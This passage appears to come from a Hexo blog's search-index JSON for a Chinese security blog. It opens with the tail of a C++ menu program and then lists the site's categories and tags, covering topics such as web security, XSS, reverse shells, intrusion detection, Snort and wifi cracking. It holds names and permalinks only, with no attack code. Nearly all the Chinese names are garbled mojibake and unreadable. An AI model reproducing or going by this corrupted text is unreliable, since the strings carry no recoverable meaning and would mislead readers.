&lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥5:æŸ¥çœ‹èœå• ***&quot; &lt;&lt; endl; &#125; &#125; return 0;&#125;","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å¯†ç å­¦","slug":"å®éªŒ/å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"å¤å…¸å¯†ç ","slug":"å¤å…¸å¯†ç ","permalink":"https://gryffinbit.top/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"}],"author":"Gryffinbit"}],"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"},{"name":"æ¼æ´æŒ–æ˜","slug":"æ¼æ´æŒ–æ˜","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"å†™ exp é‡åˆ°çš„é—®é¢˜","slug":"å†™-exp-é‡åˆ°çš„é—®é¢˜","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"},{"name":"è„†å¼±çš„æœ¬ä½“","slug":"è„†å¼±çš„æœ¬ä½“","permalink":"https://gryffinbit.top/categories/%E8%84%86%E5%BC%B1%E7%9A%84%E6%9C%AC%E4%BD%93/"},{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"},{"name":"Golang","slug":"Golang","permalink":"https://gryffinbit.top/categories/Golang/"},{"name":"JAVAå®‰å…¨","slug":"JAVAå®‰å…¨","permalink":"https://gryffinbit.top/categories/JAVA%E5%AE%89%E5%85%A8/"},{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"æµé‡åˆ†æ","slug":"Webå®‰å…¨/æµé‡åˆ†æ","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"Webå®‰å…¨/æ–‡ä»¶åŒ…å«","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"XSS","slug":"Webå®‰å…¨/XSS","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/XSS/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"å†…ç½‘æ¸—é€","slug":"æ¸—é€æµ‹è¯•/å†…ç½‘æ¸—é€","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"Webå®‰å…¨/æ–‡ä»¶ä¸Šä¼ ","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"sql","slug":"Webå®‰å…¨/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"},{"name":"å·¥å…·","slug":"æ¸—é€æµ‹è¯•/å·¥å…·","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"æ¸—é€æµ‹è¯•/ä¿¡æ¯æ”¶é›†","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"æ‚ä¸ƒæ‚å…«","slug":"å…¥ä¾µæ£€æµ‹/æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"},{"name":"å·¥å…·","slug":"å…¥ä¾µæ£€æµ‹/å·¥å…·","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E5%B7%A5%E5%85%B7/"},{"name":"suricata","slug":"å…¥ä¾µæ£€æµ‹/suricata","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/suricata/"},{"name":"snort","slug":"å…¥ä¾µæ£€æµ‹/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"},{"name":"iptables","slug":"å…¥ä¾µæ£€æµ‹/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"},{"name":"æ”»é˜²æ¨¡æ‹Ÿ","slug":"æ”»é˜²æ¨¡æ‹Ÿ","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/"},{"name":"è“é˜Ÿ","slug":"æ”»é˜²æ¨¡æ‹Ÿ/è“é˜Ÿ","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/%E8%93%9D%E9%98%9F/"},{"name":"èœœç½","slug":"å…¥ä¾µæ£€æµ‹/èœœç½","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E8%9C%9C%E7%BD%90/"},{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/categories/Linux/"},{"name":"å®æˆ˜è®°å½•","slug":"æ¸—é€æµ‹è¯•/å®æˆ˜è®°å½•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"},{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"ä¸“ä¸šè‹±è¯­","slug":"æœŸæœ«è€ƒè¯•/ä¸“ä¸šè‹±è¯­","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%B8%93%E4%B8%9A%E8%8B%B1%E8%AF%AD/"},{"name":"ä¿¡æ¯å®‰å…¨å·¥ç¨‹","slug":"æœŸæœ«è€ƒè¯•/ä¿¡æ¯å®‰å…¨å·¥ç¨‹","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B/"},{"name":"ä¿¡æ¯è®ºä¸ç¼–ç ","slug":"æœŸæœ«è€ƒè¯•/ä¿¡æ¯è®ºä¸ç¼–ç ","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%BF%A1%E6%81%AF%E8%AE%BA%E4%B8%8E%E7%BC%96%E7%A0%81/"},{"name":"ç½‘ç»œæ”»é˜²","slug":"æœŸæœ«è€ƒè¯•/ç½‘ç»œæ”»é˜²","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"},{"name":"WEBåº”ç”¨å¼€å‘","slug":"æœŸæœ«è€ƒè¯•/WEBåº”ç”¨å¼€å‘","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/WEB%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"},{"name":"æ— çº¿ç½‘ç»œå®‰å…¨","slug":"æœŸæœ«è€ƒè¯•/æ— çº¿ç½‘ç»œå®‰å…¨","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"é€†å‘","slug":"å®éªŒ/é€†å‘","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"},{"name":"æ— çº¿ç½‘ç»œå®‰å…¨","slug":"å®éªŒ/æ— çº¿ç½‘ç»œå®‰å…¨","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"ç‰©è”ç½‘","slug":"æœŸæœ«è€ƒè¯•/ç‰©è”ç½‘","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%89%A9%E8%81%94%E7%BD%91/"},{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"ç‰©è”ç½‘","slug":"å®éªŒ/ç‰©è”ç½‘","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%89%A9%E8%81%94%E7%BD%91/"},{"name":"write up","slug":"write-up","permalink":"https://gryffinbit.top/categories/write-up/"},{"name":"æ“ä½œç³»ç»Ÿ","slug":"æœŸæœ«è€ƒè¯•/æ“ä½œç³»ç»Ÿ","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"å¯ä¿¡è®¡ç®—","slug":"æœŸæœ«è€ƒè¯•/å¯ä¿¡è®¡ç®—","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97/"},{"name":"æ•°æ®ç»“æ„","slug":"æœŸæœ«è€ƒè¯•/æ•°æ®ç»“æ„","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"ç½‘ç»œå®‰å…¨æŠ€æœ¯","slug":"æœŸæœ«è€ƒè¯•/ç½‘ç»œå®‰å…¨æŠ€æœ¯","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"},{"name":"ç½‘ç»œå®‰å…¨æŠ€æœ¯","slug":"å®éªŒ/ç½‘ç»œå®‰å…¨æŠ€æœ¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"},{"name":"å…¥ä¾µæ£€æµ‹ä¸å–è¯","slug":"å®éªŒ/å…¥ä¾µæ£€æµ‹ä¸å–è¯","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"å®éªŒ/ç½‘ç»œç¼–ç¨‹","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"ç—…æ¯’åŸç†","slug":"æœŸæœ«è€ƒè¯•/ç—…æ¯’åŸç†","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%97%85%E6%AF%92%E5%8E%9F%E7%90%86/"},{"name":"å¯†ç å­¦","slug":"å®éªŒ/å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"semgrep","slug":"semgrep","permalink":"https://gryffinbit.top/tags/semgrep/"},{"name":"VUE","slug":"VUE","permalink":"https://gryffinbit.top/tags/VUE/"},{"name":"Tornado","slug":"Tornado","permalink":"https://gryffinbit.top/tags/Tornado/"},{"name":"è¿œç¨‹å¼€å‘","slug":"è¿œç¨‹å¼€å‘","permalink":"https://gryffinbit.top/tags/%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/"},{"name":"Lylme Spage","slug":"Lylme-Spage","permalink":"https://gryffinbit.top/tags/Lylme-Spage/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"XSS","slug":"XSS","permalink":"https://gryffinbit.top/tags/XSS/"},{"name":"thinkphp","slug":"thinkphp","permalink":"https://gryffinbit.top/tags/thinkphp/"},{"name":"hexo","slug":"hexo","permalink":"https://gryffinbit.top/tags/hexo/"},{"name":"wordpress","slug":"wordpress","permalink":"https://gryffinbit.top/tags/wordpress/"},{"name":"æ€è·¯","slug":"æ€è·¯","permalink":"https://gryffinbit.top/tags/%E6%80%9D%E8%B7%AF/"},{"name":"åå¼¹ shell","slug":"åå¼¹-shell","permalink":"https://gryffinbit.top/tags/%E5%8F%8D%E5%BC%B9-shell/"},{"name":"æ„Ÿæƒ³","slug":"æ„Ÿæƒ³","permalink":"https://gryffinbit.top/tags/%E6%84%9F%E6%83%B3/"},{"name":"æ·±ä¿¡æœ","slug":"æ·±ä¿¡æœ","permalink":"https://gryffinbit.top/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"},{"name":"PHP","slug":"PHP","permalink":"https://gryffinbit.top/tags/PHP/"},{"name":"xpcmdshell","slug":"xpcmdshell","permalink":"https://gryffinbit.top/tags/xpcmdshell/"},{"name":"URL","slug":"URL","permalink":"https://gryffinbit.top/tags/URL/"},{"name":"Goland","slug":"Goland","permalink":"https://gryffinbit.top/tags/Goland/"},{"name":"Golang","slug":"Golang","permalink":"https://gryffinbit.top/tags/Golang/"},{"name":"go","slug":"go","permalink":"https://gryffinbit.top/tags/go/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://gryffinbit.top/tags/Fastjson/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"bluecms","slug":"bluecms","permalink":"https://gryffinbit.top/tags/bluecms/"},{"name":"æ¼æ´æŒ–æ˜","slug":"æ¼æ´æŒ–æ˜","permalink":"https://gryffinbit.top/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"macOS13","slug":"macOS13","permalink":"https://gryffinbit.top/tags/macOS13/"},{"name":"Godzilla","slug":"Godzilla","permalink":"https://gryffinbit.top/tags/Godzilla/"},{"name":"Spring","slug":"Spring","permalink":"https://gryffinbit.top/tags/Spring/"},{"name":"Shiro","slug":"Shiro","permalink":"https://gryffinbit.top/tags/Shiro/"},{"name":"mini_httpd","slug":"mini-httpd","permalink":"https://gryffinbit.top/tags/mini-httpd/"},{"name":"Jira","slug":"Jira","permalink":"https://gryffinbit.top/tags/Jira/"},{"name":"SSRF","slug":"SSRF","permalink":"https://gryffinbit.top/tags/SSRF/"},{"name":"weblogic","slug":"weblogic","permalink":"https://gryffinbit.top/tags/weblogic/"},{"name":"Zimbra","slug":"Zimbra","permalink":"https://gryffinbit.top/tags/Zimbra/"},{"name":"ZeroShell","slug":"ZeroShell","permalink":"https://gryffinbit.top/tags/ZeroShell/"},{"name":"struts2","slug":"struts2","permalink":"https://gryffinbit.top/tags/struts2/"},{"name":"struts","slug":"struts","permalink":"https://gryffinbit.top/tags/struts/"},{"name":"ognl","slug":"ognl","permalink":"https://gryffinbit.top/tags/ognl/"},{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"https://gryffinbit.top/tags/Cobalt-Strike/"},{"name":"CVE-2022-39197","slug":"CVE-2022-39197","permalink":"https://gryffinbit.top/tags/CVE-2022-39197/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"M1","slug":"M1","permalink":"https://gryffinbit.top/tags/M1/"},{"name":"Arm","slug":"Arm","permalink":"https://gryffinbit.top/tags/Arm/"},{"name":"httpéš§é“","slug":"httpéš§é“","permalink":"https://gryffinbit.top/tags/http%E9%9A%A7%E9%81%93/"},{"name":"å†°è4.0","slug":"å†°è4-0","permalink":"https://gryffinbit.top/tags/%E5%86%B0%E8%9D%8E4-0/"},{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"},{"name":"log4j2","slug":"log4j2","permalink":"https://gryffinbit.top/tags/log4j2/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://gryffinbit.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"Goby","slug":"Goby","permalink":"https://gryffinbit.top/tags/Goby/"},{"name":"nmap","slug":"nmap","permalink":"https://gryffinbit.top/tags/nmap/"},{"name":"svnhack","slug":"svnhack","permalink":"https://gryffinbit.top/tags/svnhack/"},{"name":"githack","slug":"githack","permalink":"https://gryffinbit.top/tags/githack/"},{"name":"ç›®å½•æ‰«æ","slug":"ç›®å½•æ‰«æ","permalink":"https://gryffinbit.top/tags/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/"},{"name":"soæ–‡ä»¶","slug":"soæ–‡ä»¶","permalink":"https://gryffinbit.top/tags/so%E6%96%87%E4%BB%B6/"},{"name":"é’‰é’‰API","slug":"é’‰é’‰API","permalink":"https://gryffinbit.top/tags/%E9%92%89%E9%92%89API/"},{"name":"æœºå™¨äºº","slug":"æœºå™¨äºº","permalink":"https://gryffinbit.top/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/"},{"name":"smtp","slug":"smtp","permalink":"https://gryffinbit.top/tags/smtp/"},{"name":"java","slug":"java","permalink":"https://gryffinbit.top/tags/java/"},{"name":"python","slug":"python","permalink":"https://gryffinbit.top/tags/python/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://gryffinbit.top/tags/ubuntu/"},{"name":"svn","slug":"svn","permalink":"https://gryffinbit.top/tags/svn/"},{"name":"scapy","slug":"scapy","permalink":"https://gryffinbit.top/tags/scapy/"},{"name":"tcpreplay","slug":"tcpreplay","permalink":"https://gryffinbit.top/tags/tcpreplay/"},{"name":"suiricata","slug":"suiricata","permalink":"https://gryffinbit.top/tags/suiricata/"},{"name":"ARM","slug":"ARM","permalink":"https://gryffinbit.top/tags/ARM/"},{"name":"Perl","slug":"Perl","permalink":"https://gryffinbit.top/tags/Perl/"},{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"centos-stream-9","slug":"centos-stream-9","permalink":"https://gryffinbit.top/tags/centos-stream-9/"},{"name":"ARMæ¶æ„","slug":"ARMæ¶æ„","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallelsè™šæ‹Ÿæœº","slug":"parallelsè™šæ‹Ÿæœº","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"guardian","slug":"guardian","permalink":"https://gryffinbit.top/tags/guardian/"},{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"},{"name":"SNAT","slug":"SNAT","permalink":"https://gryffinbit.top/tags/SNAT/"},{"name":"centOS-Stream","slug":"centOS-Stream","permalink":"https://gryffinbit.top/tags/centOS-Stream/"},{"name":"NIDS","slug":"NIDS","permalink":"https://gryffinbit.top/tags/NIDS/"},{"name":"DNAT","slug":"DNAT","permalink":"https://gryffinbit.top/tags/DNAT/"},{"name":"GitHub","slug":"GitHub","permalink":"https://gryffinbit.top/tags/GitHub/"},{"name":"snortè§„åˆ™","slug":"snortè§„åˆ™","permalink":"https://gryffinbit.top/tags/snort%E8%A7%84%E5%88%99/"},{"name":"wireshark","slug":"wireshark","permalink":"https://gryffinbit.top/tags/wireshark/"},{"name":"hashcat","slug":"hashcat","permalink":"https://gryffinbit.top/tags/hashcat/"},{"name":"PyQt","slug":"PyQt","permalink":"https://gryffinbit.top/tags/PyQt/"},{"name":"conda","slug":"conda","permalink":"https://gryffinbit.top/tags/conda/"},{"name":"mysql","slug":"mysql","permalink":"https://gryffinbit.top/tags/mysql/"},{"name":"äº‘æœåŠ¡å™¨","slug":"äº‘æœåŠ¡å™¨","permalink":"https://gryffinbit.top/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://gryffinbit.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"å…¥ä¾µæ’æŸ¥","slug":"å…¥ä¾µæ’æŸ¥","permalink":"https://gryffinbit.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"},{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/tags/Linux/"},{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://gryffinbit.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"èœœç½","slug":"èœœç½","permalink":"https://gryffinbit.top/tags/%E8%9C%9C%E7%BD%90/"},{"name":"Hfish","slug":"Hfish","permalink":"https://gryffinbit.top/tags/Hfish/"},{"name":"MacOS","slug":"MacOS","permalink":"https://gryffinbit.top/tags/MacOS/"},{"name":"M1èŠ¯ç‰‡","slug":"M1èŠ¯ç‰‡","permalink":"https://gryffinbit.top/tags/M1%E8%8A%AF%E7%89%87/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://gryffinbit.top/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"linux","slug":"linux","permalink":"https://gryffinbit.top/tags/linux/"},{"name":"macos","slug":"macos","permalink":"https://gryffinbit.top/tags/macos/"},{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"Linux/MacOs","slug":"Linux-MacOs","permalink":"https://gryffinbit.top/tags/Linux-MacOs/"},{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"},{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/tags/%E5%AE%9E%E9%AA%8C/"},{"name":"PE","slug":"PE","permalink":"https://gryffinbit.top/tags/PE/"},{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/tags/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"WPA","slug":"WPA","permalink":"https://gryffinbit.top/tags/WPA/"},{"name":"C","slug":"C","permalink":"https://gryffinbit.top/tags/C/"},{"name":"WPS","slug":"WPS","permalink":"https://gryffinbit.top/tags/WPS/"},{"name":"macOS","slug":"macOS","permalink":"https://gryffinbit.top/tags/macOS/"},{"name":"wifiç ´è§£","slug":"wifiç ´è§£","permalink":"https://gryffinbit.top/tags/wifi%E7%A0%B4%E8%A7%A3/"},{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://gryffinbit.top/tags/%E6%B1%87%E7%BC%96/"},{"name":"å–è¯","slug":"å–è¯","permalink":"https://gryffinbit.top/tags/%E5%8F%96%E8%AF%81/"},{"name":"SSL","slug":"SSL","permalink":"https://gryffinbit.top/tags/SSL/"},{"name":"WinSock","slug":"WinSock","permalink":"https://gryffinbit.top/tags/WinSock/"},{"name":"WinInet","slug":"WinInet","permalink":"https://gryffinbit.top/tags/WinInet/"},{"name":"MFC","slug":"MFC","permalink":"https://gryffinbit.top/tags/MFC/"},{"name":"CA","slug":"CA","permalink":"https://gryffinbit.top/tags/CA/"},{"name":"è¯ä¹¦","slug":"è¯ä¹¦","permalink":"https://gryffinbit.top/tags/%E8%AF%81%E4%B9%A6/"},{"name":"PGP","slug":"PGP","permalink":"https://gryffinbit.top/tags/PGP/"},{"name":"å…¬é’¥ä½“åˆ¶","slug":"å…¬é’¥ä½“åˆ¶","permalink":"https://gryffinbit.top/tags/%E5%85%AC%E9%92%A5%E4%BD%93%E5%88%B6/"},{"name":"volatility","slug":"volatility","permalink":"https://gryffinbit.top/tags/volatility/"},{"name":"GNS3","slug":"GNS3","permalink":"https://gryffinbit.top/tags/GNS3/"},{"name":"IDS","slug":"IDS","permalink":"https://gryffinbit.top/tags/IDS/"},{"name":"CAsyncSocket","slug":"CAsyncSocket","permalink":"https://gryffinbit.top/tags/CAsyncSocket/"},{"name":"CSocket","slug":"CSocket","permalink":"https://gryffinbit.top/tags/CSocket/"},{"name":"gmpy2","slug":"gmpy2","permalink":"https://gryffinbit.top/tags/gmpy2/"},{"name":"å›¾ç‰‡","slug":"å›¾ç‰‡","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"},{"name":"Python","slug":"Python","permalink":"https://gryffinbit.top/tags/Python/"},{"name":"SHA-1","slug":"SHA-1","permalink":"https://gryffinbit.top/tags/SHA-1/"},{"name":"æ•£åˆ—å‡½æ•°","slug":"æ•£åˆ—å‡½æ•°","permalink":"https://gryffinbit.top/tags/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0/"},{"name":"RSA","slug":"RSA","permalink":"https://gryffinbit.top/tags/RSA/"},{"name":"AES","slug":"AES","permalink":"https://gryffinbit.top/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://gryffinbit.top/tags/DES/"},{"name":"å¤å…¸å¯†ç ","slug":"å¤å…¸å¯†ç ","permalink":"https://gryffinbit.top/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"name":"æ‚","slug":"æ‚","permalink":"https://gryffinbit.top/tags/%E6%9D%82/"},{"name":"ç¬¬ä¸€å±Šä¿¡å®‰å¤§æŒ‘æˆ˜","slug":"ç¬¬ä¸€å±Šä¿¡å®‰å¤§æŒ‘æˆ˜","permalink":"https://gryffinbit.top/tags/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98/"},{"name":"æµå¯†ç ","slug":"æµå¯†ç ","permalink":"https://gryffinbit.top/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"}]}